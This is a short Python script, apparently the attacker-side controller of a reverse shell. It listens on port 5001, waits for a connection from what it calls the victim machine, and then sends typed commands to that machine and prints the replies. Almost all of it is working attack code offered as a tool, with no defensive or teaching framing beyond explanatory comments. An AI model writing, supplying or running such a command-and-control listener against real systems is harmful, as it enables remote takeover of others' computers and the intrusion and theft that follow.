import os
from socket import socket
from time import sleep

port = 5001


def clear_terminal():

    if os.name == 'posix':  # Linux
        os.system('clear')

    elif os.name == 'nt':  # Windows
        os.system('cls')

    else:
        print("The operating system could not be determined")


def reverse_shell():

    print("\nEstablishing a listening server on port %s" % (port))

    # Create the connection socket
    server_socket = socket()

    # Indicate that the connection should only handle connections
    # made from any interface and to the corresponding port
    server_socket.bind(('0.0.0.0', port))

    # Wait for the victim machine to connect and indicate
    # that at most one connection should be made or that
    # there is only one client at most
    server_socket.listen(1)

    # Wait to receive a connection and accept it
    client_socket, victim_addres = server_socket.accept()

    print("\nEstablished connection with the victim => IP: %s" %
          (victim_addres[0]))

    while True:

        # Ask the user to enter a command
        command = input(
            "\nEnter the command you want to send to the victim machine (or 'exit' to exit): ")

        # If the user enters "exit", we close the connection and exit the loop.
        if command == 'exit':

            # Tell the victim machine to close the connection.
            client_socket.send(command.encode())

            sleep(0.5)

            # Close the connection socket
            client_socket.close()
            server_socket.close()

            break

        else:

            # Send the command to the victim machine
            client_socket.send(command.encode())

            # Wait to receive the victim's response and print the response.
            print(client_socket.recv(4096).decode())
            print()

        sleep(0.1)


def main():

    clear_terminal()

    reverse_shell()


main()
